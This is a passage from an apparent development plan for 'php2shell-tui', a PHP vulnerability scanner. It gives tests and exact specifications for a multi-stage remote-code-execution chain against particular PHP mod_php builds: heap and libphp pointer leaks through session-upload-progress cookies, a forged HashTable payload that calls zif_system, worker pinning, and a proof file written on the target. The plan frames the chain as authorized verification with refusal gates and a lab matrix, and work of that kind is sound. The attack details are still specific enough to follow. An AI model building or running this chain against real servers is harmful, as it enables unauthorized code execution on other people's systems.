    self::assertSame('31dcd8062596f239a5d8fb18050f8894865755573eae1814ccebb7729694988f', $this->hashFile($b));
}

public function testFakePayloadAndStageThreeMatchTheOracle(): void
{
    $builder = new PayloadBuilder();
    $htAddress = 0x7ffffc4690d8;
    $zif = 0x7ffffe478370;
    $payload = $builder->fakePayload($htAddress, $zif, 'echo ABCDEFG>p');

    self::assertSame(167, strlen($payload['ht']));
    self::assertSame('6e4b5a7decc2b4116db07fc52807b66f2ba21795d8218b6f4bfc0e22efce1860', hash('sha256', $payload['ht']));
    self::assertNotNull($payload['carrier']);
    self::assertSame(15, strlen($payload['carrier']));

    $a = $this->tmp . '/stage3-a.bin';
    $b = $this->tmp . '/stage3-b.bin';
    $builder->stage3A($a, array_fill(0, 6, [31, 31]), 1);
    $builder->stage3B($b, $payload['ht'], null, $payload['carrier']);

    self::assertSame(1_049_815, filesize($a));
    self::assertSame('12ee947dd1f3fbf68170b42a1b5d3484a46d75f8280bea9c01c34d11702d0154', $this->hashFile($a));
    self::assertSame(4_278, filesize($b));
    self::assertSame('57943ac097690841320b0d12664d00c0ebb755147e543cfe591a6183a6c5a06e', $this->hashFile($b));
}
```

Create `tests/Unit/CookieLeakParserTest.php`:

```php
public function testItParsesTheTwoMbChunkBase(): void
{
    $raw = '';
    $chunk = 0xffff8bc00000; // aarch64-style high pointer
    for ($i = 0; $i < 12; $i++) {
        $raw .= pack('P', $chunk + $i * 8);
    }
    $cookie = rawurlencode($raw);
    $response = "HTTP/1.1 200 OK\r\nSet-Cookie: PHPSESSID=" . $cookie . "; path=/\r\n\r\n";

    self::assertSame(0xffff8bc00000, CookieLeakParser::chunkBase(CookieLeakParser::cookie($response)));
}

public function testItParsesTheLibphpPointerAtOffsetEight(): void
{
    $libphp = 0x7ffffe013000;
    $dtor = $libphp + 0x65eb60;
    $raw = str_repeat("\0", 8) . pack('P', $dtor) . str_repeat("\0", 24);
    $cookie = rawurlencode($raw);

    self::assertSame($libphp, CookieLeakParser::libphpBase($cookie, 0x65eb60));
}

public function testItRejectsACookieWithoutPointers(): void
{
    self::assertSame(0, CookieLeakParser::chunkBase('not a pointer'));
    self::assertSame(0, CookieLeakParser::libphpBase('short', 0x65eb60));
}
```

- [ ] **Step 2: Run the tests and verify they fail**

Run: `vendor/bin/phpunit tests/Unit/PayloadBuilderTest.php tests/Unit/CookieLeakParserTest.php -v`
Expected: FAIL with missing classes.

- [ ] **Step 3: Implement `PayloadBuilder`**

Use boundary `CCCCCCCCCC` for stage 1/2/3 B, `SSSSSSSSSSSSSSSSS` (17 `S`) for preludes and stage 3 A, `BNDRY12345` for rotate B.

Exact shapes:
- `rotateA`: `f0000`…`f1000` names with `V * 3000` values; `PHPSESSID` = `"\0"`; `PHP_SESSION_UPLOAD_PROGRESS` = `pwn`; file part (`name=f`, `filename=a.txt`, 64 `A`); `big` = `B * (hugeMb * 1024 * 1024)`.
- `rotateB`: `PHPSESSID` = `attacksessionid0001`; `PHP_SESSION_UPLOAD_PROGRESS` = `pwn`.
- `stage1A`: `p0000`…`p1000` with `x`; `PHPSESSID="\0"`; progress `pwn`; file; big.
- `stage1B`: `PHPSESSID=attacksessionid0001`; progress `pwn`; for `i < stage1N`, name `(string)(1000 + i)` and value `(sprintf('v%04d', $i) . str_repeat('x', 44))` truncated to 48 bytes; then name `1999` and the forge: `str_repeat('A', $forgeLen)`, put `pack('Q', 0x1000)` at offset 0x10, put `L` at 0x18.
- `stage2A`: names `f0000`…`f1000` (5 chars) with `x * 39`; `PHPSESSID="\0"`; progress `pwn`; file; big.
- `stage2B`: `PHPSESSID=attacksessionid0001`; progress `pwn`; for `i < 983`, count `$i === $stage2T ? 16 : 1`; names `sprintf('a%04d[%d]', $i, $j)`; values `x * $stage2V`.
- `stage3A`: `PHPSESSID=str_repeat('a',19)`; progress `ppp`; for each pad `[nl, vl]`, name `substr(sprintf('p%0'.($nl - 1).'d', $i), 0, $nl)` and value `str_repeat('V', $vl)`; file; big.
- `stage3B` with `$carrier !== null`: `PHPSESSID=attacksessionid0001`; progress `pwn`; `f00`/`f01` values `F * 15`; `g00` value `$carrier`; 15 fields named `substr(sprintf('a%030d', $i), 0, 31)` with `$ht`.
- `stage3B` with `$ref !== null`: 15 `a…` fields with `$ht`, then `f00`/`f01` with `$ref`.
- `fakePayload($htdata, $zif, $command)`:
  - `$ht = str_repeat("\0", 167)`; write the fake HashTable exactly as the spec §4.2.2/upstream: `gc`, flags, arData, counts, pDestructor, fake execute_data, fake zend_string at 0x80, command at 0x98.
  - `$ref = 55` bytes; offsets 0x10/0x18/0x20/0x28 as upstream.
  - `$carrier = pack('V', 1) . pack('V', 0x1A) . substr(pack('P', $htdata), 0, 7)`.
  - Reject a command longer than 14 bytes.
- All bodies use `Content-Disposition` exactly as the oracle; no charset; CRLF line endings.

- [ ] **Step 4: Implement `CookieLeakParser`**

- `cookie()` finds `Set-Cookie: PHPSESSID=`, takes the value up to CRLF, splits at `;`, rawurldecodes; throws `RuntimeException` if absent/empty.
- `chunkBase()` iterates every 8-byte window (not just aligned) over the raw cookie; pointer if `0x10000 < $v < 0x0001000000000000`; bucket `$v & ~0x1FFFFF`; returns the most common bucket if count >= 8, else 0.
- `libphpBase()` requires at least 16 bytes; reads the little-endian 64-bit at offset 8; requires the widened pointer range; requires `($p & 0xFFF) === ($dtorOffset & 0xFFF)`; subtract and require `base & 0xFFF === 0`; else 0.

- [ ] **Step 5: Run the tests**

Run: `vendor/bin/phpunit tests/Unit/PayloadBuilderTest.php tests/Unit/CookieLeakParserTest.php -v`
Expected: PASS with the golden sizes and hashes.

- [ ] **Step 6: Commit**

```bash
git add src/Poc/PayloadBuilder.php src/Poc/CookieLeakParser.php tests/Unit/PayloadBuilderTest.php tests/Unit/CookieLeakParserTest.php
git commit -m "feat: port the parametric PHP2Shell payload builders and cookie parser"
```

---

## Task 4: Raw HTTP transport with concurrent read

**Files:**
- Create: `src/Poc/RawHttp.php`
- Create: `tests/Unit/RawHttpTest.php`
- Modify: `tests/Fixture/raw_server.php`

**Interfaces:**
- Consumes: target scheme/host/port/timeout/headers.
- Produces:
  ```php
  final class RawHttp
  {
      public function __construct(
          string $scheme,
          string $host,
          int $port,
          float $timeout,
          array $headers = [],
      );
      public function sendBody(
          string $path,
          string $bodyFile,
          string $contentType,
          int $readCap,
          ?float $timeout = null,
          array $extraHeaders = [],
      ): string;
      public function sendNow(string $path, string $bodyFile, string $contentType, ?float $timeout = null, array $extraHeaders = []): void;
      public function openIncompletePost(string $path, int $contentLength): mixed;
      public function close(): void;
  }
  ```

- [ ] **Step 1: Write the failing transport tests**

Create `tests/Unit/RawHttpTest.php` using the existing `server()` helper. Keep:
- `testSendBodySendsContentLengthAndReturnsTheResponse` (adapt to `sendBody($path, $body, 'multipart/form-data; boundary=CCCCCCCCCC', 1 << 20)`).
- `testSendBodyHandlesInterimResponses`.
- `testOpenIncompletePostHoldsTheConnectionAndSendsContentLength`.
- `testItRejectsAnUnsupportedScheme`, `testItRejectsAnInvalidPort`, `testCloseIsIdempotent`.
- `testItRejectsAnUnreadableBodyFile` using `sendBody('/index.php', '/no/such/body.bin', 'multipart/form-data; boundary=CCCCCCCCCC', 1 << 20)`.

Add:

```php
public function testItReadsAnEarlyResponseWhileTheBodyIsStillUploading(): void
{
    [$port, $capture, $process, $dir] = $this->server('early');
    $body = $dir . '/body.bin';
    file_put_contents($body, str_repeat('A', 2 * 1024 * 1024));

    try {
        $http = new RawHttp('http', '127.0.0.1', $port, 5.0);
        $response = $http->sendBody(
            '/index.php',
            $body,
            'multipart/form-data; boundary=CCCCCCCCCC',
            9 << 20,
        );
        $http->close();

        self::assertStringContainsString('HTTP/1.1 200 OK', $response);
        self::assertStringContainsString('EARLY', $response);
    } finally {
        $this->stopServer($process, $dir);
    }
}
```

Add an `early` mode to `tests/Fixture/raw_server.php`: after reading only the headers, write
`HTTP/1.1 200 OK\r\nContent-Length: 5\r\nConnection: close\r\n\r\nEARLY` and close the socket without draining the body. The client must capture `EARLY` while its write may fail.

- [ ] **Step 2: Run the tests and verify they fail**

Run: `vendor/bin/phpunit tests/Unit/RawHttpTest.php -v`
Expected: FAIL with missing `sendBody`/`RawHttp` or the old chunked API.

- [ ] **Step 3: Implement `RawHttp`**

- `sendBody` opens a socket, writes the request head with `Content-Length`, then enters a non-blocking write/read loop:
  - `stream_set_blocking($socket, false)`.
  - Keep `$out = head . file contents` (or stream the file in 256 KiB slices), `$outOffset`, `$response`, `$deadline`.
  - `stream_select($read, $write, $except, 0, 200000)`.
  - Write the next slice when writable; on `false`/`0`, set `$writeFailed` and keep reading.
  - Read 64 KiB when readable; stop on EOF, read cap, `Content-Length` satisfied, or the chunked terminator `\r\n0\r\n\r\n`.
  - Ignore write errors after the server has responded (the worker may abort mid-upload).
  - Respect the per-call timeout and the read cap.
- `sendNow` is the same without reading the response (used for preludes/stage3 B); use a short read and close.
- `openIncompletePost` stays: connect, write the head with `Content-Length`, write `x`, keep the socket. Use `Connection: keep-alive`.
- `requestHead` merges extra headers, skips `content-type`, `content-length`, `transfer-encoding`, `connection`, `expect`; supports `Host` override.
- `close` closes all held sockets; idempotent.
- Remove `sendChunked` entirely.

- [ ] **Step 4: Run the tests**

Run: `vendor/bin/phpunit tests/Unit/RawHttpTest.php -v`
Expected: PASS, including the early-response test.

- [ ] **Step 5: Commit**

```bash
git add src/Poc/RawHttp.php tests/Unit/RawHttpTest.php tests/Fixture/raw_server.php
git commit -m "feat: stream raw multipart bodies and read responses concurrently"
```

---

## Task 5: Parametric chain orchestration and proof

**Files:**
- Create: `src/Poc/Php2ShellPoc.php`
- Modify: `src/Poc/PocResult.php`
- Modify: `src/Poc/ProofPath.php` (1-character proof names only)
- Create: `tests/Unit/Php2ShellPocTest.php`
- Modify: `tests/Unit/PocResultTest.php`
- Modify: `tests/Unit/ProofPathTest.php`

**Interfaces:**
- Consumes: `Profile`, `PocPlan`, `PayloadBuilder`, `CookieLeakParser`, `RawHttp`, `ProofPath`, `Client`, `Target`.
- Produces:
  ```php
  final class Php2ShellPoc
  {
      public function __construct(
          private readonly ?PayloadBuilder $builder = null,
          private readonly ?Client $client = null,
      );
      public function run(
          Target $target,
          Profile $profile,
          PocPlan $plan,
          ?\Closure $onTick = null,
      ): PocResult;
      public function probeMemoryLimit(Target $target, float $requestTimeout): ?int;
  }

  final class PocResult
  {
      public function __construct(
          public readonly bool $confirmed,
          public readonly string $reason,
          public readonly ?string $proof = null,
          public readonly ?string $evidence = null,
          public readonly ?string $proofPath = null,
      );
  }
  ```

- [ ] **Step 1: Write the failing orchestration tests**

Create `tests/Unit/Php2ShellPocTest.php`:

```php
private function profile(): Profile
{
    return Profile::fromFile(__DIR__ . '/../../src/Data/poc/php-8.4.26-bookworm-amd64.json');
}

public function testItRefusesAnUnverifiedProfileBeforeSending(): void
{
    $data = json_decode((string) file_get_contents(
        __DIR__ . '/../../src/Data/poc/php-8.4.26-bookworm-amd64.json'
    ), true, 512, JSON_THROW_ON_ERROR);
    $data['rce'] = false;

    $result = (new Php2ShellPoc())->run(
        new Target('http://127.0.0.1:1/', postPath: '/index.php'),
        Profile::fromArray($data),
        new PocPlan(workers: 1, memoryLimitMb: 8),
    );

    self::assertFalse($result->confirmed);
    self::assertStringContainsString('not verified', $result->reason);
}

public function testItRefusesAnFpmProfileBeforeSending(): void
{
    $data = json_decode((string) file_get_contents(
        __DIR__ . '/../../src/Data/poc/php-8.4.26-bookworm-amd64.json'
    ), true, 512, JSON_THROW_ON_ERROR);
    $data['sapi'] = 'fpm-fcgi';

    $result = (new Php2ShellPoc())->run(
        new Target('http://127.0.0.1:1/', postPath: '/index.php'),
        Profile::fromArray($data),
        new PocPlan(workers: 1, memoryLimitMb: 8),
    );

    self::assertFalse($result->confirmed);
    self::assertStringContainsString('mod_php', $result->reason);
}

public function testAWorkerCountAboveTheCapIsRejectedByThePlan(): void
{
    $this->expectException(\InvalidArgumentException::class);
    new PocPlan(workers: 201, maxWorkers: 200);
}

public function testItRefusesMissingWorkersAndMemory(): void
{
    $poc = new Php2ShellPoc();

    $noWorkers = $poc->run(
        new Target('http://127.0.0.1:1/', postPath: '/index.php'),
        $this->profile(),
        new PocPlan(memoryLimitMb: 8),
    );
    self::assertStringContainsString('workers', $noWorkers->reason);

    $noMemory = $poc->run(
        new Target('http://127.0.0.1:1/', postPath: '/index.php'),
        $this->profile(),
        new PocPlan(workers: 1),
    );
    self::assertStringContainsString('memory limit', $noMemory->reason);
}

public function testItRefusesAMissingProofClient(): void
{
    $result = (new Php2ShellPoc())->run(
        new Target('http://127.0.0.1:1/', postPath: '/index.php'),
        $this->profile(),
        new PocPlan(workers: 1, memoryLimitMb: 8),
    );

    self::assertFalse($result->confirmed);
    self::assertStringContainsString('proof client', $result->reason);
}
```

`PocResultTest` updates to the five-field constructor.

`ProofPathTest` adds:

```php
public function testTheProofFileIsOneCharacter(): void
{
    self::assertMatchesRegularExpression('/^[a-z0-9]$/', ProofPath::randomFile());
}
```

- [ ] **Step 2: Run the tests and verify they fail**

Run: `vendor/bin/phpunit tests/Unit/Php2ShellPocTest.php tests/Unit/PocResultTest.php tests/Unit/ProofPathTest.php -v`
Expected: FAIL with missing classes or the old `terminal` field.

- [ ] **Step 3: Implement `PocResult` and `ProofPath`**

- `PocResult` loses `terminal`; keep the five readonly fields.
- `ProofPath::randomFile()` returns one lowercase alphanumeric; `candidates()` stays (two candidates).
- Update `PocResultTest` and any callers still passing `terminal`.

- [ ] **Step 4: Implement `Php2ShellPoc`**

Validation and flow:

1. Reject before any socket:
   - `$profile->rceVerified()` false → `profile is not verified for RCE`.
   - `strtolower($profile->sapi()) !== 'apache2handler'` → `the verified chain is mod_php only`.
   - `$plan->workers === null` → `workers are not configured`.
   - `$plan->memoryLimitMb === null` → `memory limit is not resolved`.
   - `$plan->workers < 1 || $plan->workers > $plan->maxWorkers` → `worker cap exceeded`.
   - `$this->client === null` → `proof client is not configured`.
   - target scheme/host/port valid.
   - if `posix_getrlimit()` exists and `$plan->workers + 20 > openfiles_soft` → `local file-descriptor budget is too small`.
2. Proof path:
   - Loop up to 5: `$file = ProofPath::randomFile(); $candidates = ProofPath::candidates($path, $file)`; GET each candidate with a cache-busting query; require 404 for all. If not free, choose another. On exhaustion → `proof paths are not free`.
   - `$marker = 7 random [A-Za-z0-9]`; `$command = 'echo ' . $marker . '>' . $file`; assert `strlen($command) === 14`.
3. `$hugeMb = ($plan->memoryLimitMb === 8 && $profile->oomMb() > 0) ? $profile->oomMb() : $plan->memoryLimitMb + $profile->oomMarginMb()`.
4. `$raw = new RawHttp($scheme, $host, $port, $plan->requestTimeout, $target->requestHeaders())`.
5. Pin workers: while `$holders < $plan->workers - 1`, `openIncompletePost($path, 1048576)`, wait 10 ms; if it fails, return `worker pinning failed`; then wait 800 ms. `workers = 1` skips.
6. Add private `tick(?\Closure $onTick): void` and `wait(int $microseconds, ?\Closure $onTick): void` helpers (the existing TUI pattern). Call `tick()` before every send and use `wait()` for the 200/300/500/800 ms pauses so the TUI can cancel/restart between requests.
7. `rotate()`:
   - `$builder->rotateA($a, $hugeMb)`; `$raw->sendNow($path, $a, 'multipart/form-data; boundary=SSSSSSSSSSSSSSSSS', 90.0)`; sleep 300 ms.
   - `$builder->rotateB($b)`; `$raw->sendNow($path, $b, 'multipart/form-data; boundary=BNDRY12345', 90.0)`; sleep 500 ms.
8. Stage 1 retries `1..$plan->retries`:
   - `stage1A`; send with boundary `S*17`, read cap 1 MiB, timeout 90; sleep 200 ms.
   - `stage1B($n, $forge)`; `sendBody(..., 9 << 20)`; `$chunk = CookieLeakParser::chunkBase(CookieLeakParser::cookie($response))`.
   - If `$chunk > 0`, break; else rotate and retry.
   - No chunk after retries → `stage 1 heap leak failed`.
9. Rotate.
10. Stage 2 retries:
    - `stage2A`; send; sleep 200 ms.
    - `stage2B`; `sendBody(..., 1 << 20)`; `$libphp = CookieLeakParser::libphpBase($cookie, $profile->libphp()['zval_ptr_dtor'])`.
    - If `$libphp > 0`, break; else rotate and retry.
    - No libphp → `stage 2 libphp leak failed`.
11. Rotate.
12. `$htdata = $chunk + $profile->libphp()['htdata']; $zif = $libphp + $profile->libphp()['zif_system']; $payload = $builder->fakePayload($htdata, $zif, $command);`
13. Stage 3 attempts `1..($plan->retries + 2)`:
    - `stage3A($profile->stage3Pads(), $hugeMb)`; send with boundary `S*17`, timeout 90; sleep 300 ms.
    - `stage3B($payload['ht'], $payload['ref'], $payload['carrier'])`; send with boundary `B*10`, read cap 64 KiB, timeout 30; sleep 800 ms.
    - For each proof candidate: GET `$origin . $candidate . '?p2s=' . bin2hex(random_bytes(4))` with target headers; if 200 and `trim(body) === $marker` → confirmed, `proofPath` = the URL, evidence JSON with profile/chunk/libphp/zif/htdata/marker.
    - Else rotate and continue; deadline check.
14. Exhausted → `proof not retrievable from the candidate paths`.
15. `finally`: `$raw->close()`, delete temp files.

The stage3 A request adds `Cookie: PHPSESSID=` + 32 `a` when `$profile->upstreamProfile() === 'bookworm'` (all five).

`probeMemoryLimit()`:
- For `$mb` in `[16, 64, 256]`: write `big=` + `A * ($mb * 1024 * 1024)` to a temp file; `sendBody($path, $body, 'application/x-www-form-urlencoded', 65536, $requestTimeout)`; if `preg_match('/Allowed memory size of (\d+) bytes/i', $response, $m)` → return `max(1, intdiv((int)$m[1], 1048576))`.
- Return null if none.
- Delete temp files.

- [ ] **Step 5: Run the tests**

Run: `vendor/bin/phpunit tests/Unit/Php2ShellPocTest.php tests/Unit/PocResultTest.php tests/Unit/ProofPathTest.php -v`
Expected: PASS. The full chain is lab-only; these tests pin every refusal before a socket.

- [ ] **Step 6: Commit**

```bash
git add src/Poc/Php2ShellPoc.php src/Poc/PocResult.php src/Poc/ProofPath.php tests/Unit/Php2ShellPocTest.php tests/Unit/PocResultTest.php tests/Unit/ProofPathTest.php
git commit -m "feat: orchestrate the parametric chain and unique-marker proof"
```

---

## Task 6: Wire verification, gates, and CLI

**Files:**
- Modify: `src/Check/Php2Shell.php`
- Modify: `src/Command/ScanCommand.php`
- Modify: `src/Config.php` (only if a validation gap remains)
- Modify: `tests/Unit/Php2ShellTest.php`
- Modify: `tests/Integration/ScanCommandTest.php`

**Interfaces:**
- Consumes: `ProfileCatalog`, `PocPlan`, `Php2ShellPoc`, `PhpFingerprint`, `PocResult`.
- Produces: the final `Php2Shell` constructor:
  ```php
  public function __construct(
      private readonly Reproduce $reproduce,
      private readonly bool $verify,
      private readonly PhpVersionDb $db,
      private readonly ?Php2ShellPoc $poc = null,
      private readonly ?ProfileCatalog $catalog = null,
      private readonly ?PocPlan $plan = null,
      private readonly ?Client $client = null,
      private readonly ?\Closure $runner = null,
  )
  ```

- [ ] **Step 1: Write the failing gate tests**

Add to `tests/Unit/Php2ShellTest.php` a helper `responses(array $overrides = [])` that returns the baseline + phpinfo body, and a `runner` closure:

```php
private function runner(array &$calls, ?PocResult $result = null): \Closure
{
    $result ??= new PocResult(true, 'RCE confirmed', 'ABCDEFG', null, 'https://app.example/p');

    return static function (Target $target, Profile $profile, PocPlan $plan) use (&$calls, $result): PocResult {
        $calls[] = [$profile->id(), $plan->memoryLimitMb, $plan->workers];
        return $result;
    };
}
```

Tests:

```php
public function testItReportsCriticalOnlyForAConfirmedProof(): void
{
    $calls = [];
    $check = new Php2Shell(
        $this->reproduce, true, $this->db,
        new Php2ShellPoc(),
        new ProfileCatalog(__DIR__ . '/../../src/Data/poc'),
        new PocPlan(workers: 1, memoryLimitMb: 128),
        null,
        $this->runner($calls),
    );

    $findings = $check->analyze($this->target, $this->responses());

    self::assertSame([['php-8.4.26-bookworm-amd64', 128, 1]], $calls);
    $rce = array_values(array_filter($findings, static fn ($f): bool => $f->id === 'php2shell-rce'))[0];
    self::assertSame(Severity::Critical, $rce->severity);
    self::assertStringContainsString('ABCDEFG', $rce->evidence);
}

public function testItSendsNoPayloadForAKnownFpmTarget(): void
{
    $calls = [];
    $check = new Php2Shell(
        $this->reproduce, true, $this->db,
        new Php2ShellPoc(),
        new ProfileCatalog(__DIR__ . '/../../src/Data/poc'),
        new PocPlan(workers: 1, memoryLimitMb: 128),
        null,
        $this->runner($calls),
    );

    $findings = $check->analyze($this->target, $this->responses(['sapi' => 'FPM/FastCGI']));

    self::assertSame([], $calls);
    $info = array_values(array_filter($findings, static fn ($f): bool => $f->id === 'php2shell-poc-inconclusive'))[0];
    self::assertStringContainsString('mod_php', $info->evidence);
}
```

Add analogous tests for:
- `display_errors=Off` → no call, Info contains `display_errors`.
- `session.upload_progress.enabled=Off` → no call, Info contains `session.upload_progress`.
- `session.use_strict_mode=1` → no call.
- `memory_limit=-1` → no call, Info contains `memory_limit`.
- `post_max_size=8M` with `memory_limit=128M` → no call, Info contains `post_max_size`.
- missing `workers` → no call, Info contains `workers`.
- version `8.5.11` without arch → no call, Info contains `arch`.
- version `7.4.33` → no call, Info contains `no calibrated profile`.
- distro `Ubuntu` with the Debian profile → no call, Info contains `debian`.
- runner returns `PocResult(false, 'no proof')` → Info, `exploit` says "do not treat this as safe".

- [ ] **Step 2: Run the tests and verify they fail**

Run: `vendor/bin/phpunit tests/Unit/Php2ShellTest.php -v`
Expected: FAIL because the temporary `verification runner is not wired yet` path ignores the runner/catalog.

- [ ] **Step 3: Implement the check flow**

`Php2Shell::analyze()`:
1. Build `$fingerprint`.
2. `$findings = [$this->exposureFinding($target, $fingerprint)]`.
3. If `!$verify`, return.
4. If `$this->catalog === null || $this->plan === null` → append `inconclusive('verification is not configured')`.
5. Select:
   - `$explicit = $this->plan->profile ?? $target->pocProfile;`
   - `$versions = $this->plan->version !== null ? [$this->plan->version] : array_values(array_unique(array_column($fingerprint->versions(), 'version')));`
   - If `$versions === []` and `$explicit === null` → `inconclusive('PHP version is unknown; pass --php-version X.Y.Z')`.
   - If `$versions === []` and `$explicit !== null` → `$selection = $catalog->select(null, $plan->arch, $explicit, $fingerprint->serverOs());`
   - Otherwise, for each version in order: `$selection = $catalog->select($version, $plan->arch, $explicit, $fingerprint->serverOs());` if profile → break; else keep the first reason.
   - No profile → `inconclusive($reason)`.
6. Gate:
   - workers null → `workers are not configured; set poc.workers to the target MaxRequestWorkers`.
   - SAPI FPM → `the verified chain is mod_php only`.
   - upload progress Off → `session.upload_progress.enabled is off`.
   - display errors Off → `display_errors is off; the parametric chain needs it on`.
   - strict mode 1 → `session.use_strict_mode is on`.
   - memory `-1` → `memory_limit is unlimited`.
   - resolve memory (plan value, phpinfo, probe, fallback profile `oomMb()`).
   - `huge = ...`; if `post_max_size` is positive and below `huge` → `post_max_size is below the required <n>M`.
   - `$plan = $plan->withMemoryLimit($memory);`
7. `$result = $runner !== null ? ($runner)($target, $profile, $plan) : $this->poc?->run($target, $profile, $plan, $this->onTick);`
   - If `$this->poc === null` and no runner → `inconclusive('proof runner is not configured')`.
8. If `$result->confirmed` → `rceFinding($target, $profile, $result)`; else `inconclusive($result->reason)`.
9. Keep `reportVerify($target, 1, 1)` before the run.

`exposureFinding()` also uses the resolved conditions; do not duplicate the size parser: add private `sizeToMb(?string $value): ?int` and `memoryLimitMb()` / `postMaxSizeMb()` helpers used by both the exposure and the gate.

`ScanCommand`:
- Construct the POC and pass it:
  ```php
  new Php2Shell(
      $reproduce,
      $verify,
      $db,
      new Php2ShellPoc(client: $client),
      new ProfileCatalog($dataDir . '/poc'),
      $plan,
      $client,
  )
  ```
- Remove the old `workers:` argument.
- Keep the CLI options from Task 2.

`tests/Integration/ScanCommandTest.php`:
- `--verify` with no `poc.workers` returns the exposure + Info `workers`; no POST.
- `--verify --php-version 7.4.33 --workers 1` returns Info `no calibrated profile`; no POST.
- The fixture server access log is empty for both.

- [ ] **Step 4: Run the suite**

Run: `vendor/bin/phpunit --no-coverage`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/Check/Php2Shell.php src/Command/ScanCommand.php tests/Unit/Php2ShellTest.php tests/Integration/ScanCommandTest.php
git commit -m "feat: gate and run the calibrated PHP2Shell chain under --verify"
```

---

## Task 7: Docs, config, reproduce steps, PHAR

**Files:**
- Modify: `php2shell-tui.yaml`
- Modify: `README.md`
- Modify: `src/Data/repro/php2shell-rce.md`
- Modify: `src/Data/repro/php2shell-exposure.md` (if Step 1 wrote it)
- Build: `php2shell-tui`

**Interfaces:**
- Consumes: the final CLI/config from Task 6.
- Produces: user-facing docs and the rebuilt PHAR.

- [ ] **Step 1: Update `php2shell-tui.yaml`**

Replace the `poc` block with:

```yaml
poc:
  workers: 150                               # target prefork MaxRequestWorkers; 1 for a single-worker lab
  # memory_limit: 128                        # optional MiB; omit to use phpinfo or the OOM probe
  timeout: 300                               # overall seconds for one verification
  request_timeout: 90                        # per raw request
  retries: 3                                 # stage1/stage2; stage3 uses retries + 2
  max_workers: 200                           # refuse a config above this pin count
  # profile: php-8.4.26-bookworm-amd64       # optional exact override
```

Remove `guess`, `arch`, `max_attempts`, `total_timeout`, `profiles`.

- [ ] **Step 2: Update the README**

Replace the "Profiles and guess mode" section with:

- default detection: version + phpinfo/SAPI/preconditions, no POST;
- `--verify` real chain for the five builds;
- exact version/arch/workers; fail-fast examples;
- 7.4–8.3 detection-only;
- no canary, no arming probe;
- intrusive warning (worker pinning, 12 MB bodies, worker rotation, proof file);
- proof cleanup;
- the `--php-version`/`--arch`/`--profile`/`--workers`/`--memory-limit` flags.

Update the "Known limitation" section: the old 403/407/429/503 skip still applies to detection; `--verify` is not attempted for an unscannable baseline.

- [ ] **Step 3: Update the reproduce steps**

`src/Data/repro/php2shell-rce.md`:

```markdown
# Run only against an authorized target with a calibrated profile.
bin/php2shell-tui scan --config <authorized-target>.yaml --no-tui --format json --verify --php-version <x.y.z> --arch <amd64|aarch64> --workers <target-maxrequestworkers>

# The chain writes a one-character proof file. Remove it from the target working directory after the proof is fetched.
```

`php2shell-exposure.md` keeps the detection + verify commands from Task 1.

- [ ] **Step 4: Run the suite and build the PHAR**

Run:

```bash
composer test
composer build
./php2shell-tui --version
./php2shell-tui scan --help
```

Expected: tests PASS; `composer build` produces `php2shell-tui`; the help lists the new options.

- [ ] **Step 5: Verify the PHAR carries the five profiles**

Run:

```bash
./php2shell-tui scan --config php2shell-tui.yaml --no-tui --format json 2>&1 | head
```

Expected: the PHAR starts and reads its bundled data. Also run it with a config pointing at one lab and no `--verify`; it must not POST.

- [ ] **Step 6: Commit**

```bash
git add php2shell-tui php2shell-tui.yaml README.md src/Data/repro/php2shell-rce.md src/Data/repro/php2shell-exposure.md
git commit -m "docs: document calibrated verification and rebuild the PHAR"
```

---

## Task 8: Real lab matrix and release gate

**No repo files are committed from this task except fixes the lab proves necessary.**

**Lab setup (temp directory, never in git):**
- Use Docker. For each build: `php:8.4.25-apache`, `php:8.4.26-apache`, `php:8.5.10-apache`, `php:8.5.11-apache`.
- Use `--platform linux/arm64` on Apple Silicon for the aarch64 builds; `--platform linux/amd64` for the amd64 builds.
- Mount a temp php.ini with:
  - `display_errors=On`, `display_startup_errors=On`, `error_reporting=E_ALL`;
  - `memory_limit=8M`, `post_max_size=64M`, `upload_max_filesize=64M`;
  - `session.save_path=/tmp`, `session.use_strict_mode=0`, `session.use_cookies=1`;
  - `session.upload_progress.enabled=On`, `session.upload_progress.cleanup=On`.
  - For the 128M 8.4.26 run, `memory_limit=128M`, `post_max_size=256M`.
- Mount a temp Apache config with a single worker (`StartServers 1`, `MaxRequestWorkers 1`, `ServerLimit 1`, `KeepAlive Off`) and a second config with 2 or 4 workers for the pinning test.
- Webroot: `index.php` prints `OK`; `phpinfo.php` calls `phpinfo()`.
- Publish each on a free localhost port.

- [ ] **Step 1: Default scan on every lab**

Run `bin/php2shell-tui scan --config <lab>.yaml --no-tui --format json`.
Assert:
- `php2shell-exposure` present;
- no `php2shell-rce`;
- the container access log has no POST.

- [ ] **Step 2: Real chain on all five builds**

For each build, run with the exact profile, arch and workers:

```bash
bin/php2shell-tui scan --config <lab>.yaml --no-tui --format json --verify \
  --php-version <version> --arch <arch> --workers 1
```

Assert:
- one `php2shell-rce` Critical;
- the marker in the finding equals the fetched proof body;
- the proof URL is reachable and contains the marker;
- no other profile was attempted (only one profile load/chain).

Repeat the 8.4.26 amd64 run with `--memory-limit 128` and a 256M `post_max_size` lab. Repeat 8.4.26 amd64 on a 2-worker and 4-worker lab with `--workers 2`/`--workers 4`.

- [ ] **Step 3: Negative matrix**

Assert zero payload bytes and the correct Info reason for:
- `php:8.4.27-apache` and `php:8.5.12-apache` (patched);
- `php:8.4.26-fpm` + nginx (FPM);
- `display_errors=Off`;
- `post_max_size=8M` with `memory_limit=128M`;
- `session.upload_progress.enabled=Off`;
- `session.use_strict_mode=1`;
- `memory_limit=-1`;
- `--php-version 7.4.33`;
- `--php-version 8.5.11` without `--arch`;
- missing `--workers`;
- Ubuntu `Server` header with the Debian profile;
- pre-existing proof file;
- catch-all 200 for the proof candidates.

- [ ] **Step 4: Hidden version**

Keep `expose_php=On` so the build matches the calibration, remove `phpinfo.php`, and strip
`X-Powered-By` at the edge (or otherwise ensure no HTTP response carries a PHP version). Run with
`--verify --php-version 8.4.26 --arch amd64 --workers 1`.
Assert the real marker proof succeeds and the audit finding says no PHP version was disclosed.
A genuine `expose_php=Off` build changes the heap layout; record its result separately. If the
chain runs but no proof is retrievable, report that limitation; do not claim RCE.

- [ ] **Step 5: Go scanner cross-check**

Run `php2shell-scanner url -u <lab> --probe=false` against each lab and compare the version/SAPI/config findings with `php2shell-exposure`. Record contradictions and fix them before release.

- [ ] **Step 6: PHAR release check**

Run the same positive/negative checks with the built `./php2shell-tui` PHAR, not only `bin/php2shell-tui`.
Assert the PHAR bundles the five profiles and behaves identically.

- [ ] **Step 7: Cleanup and final verification**

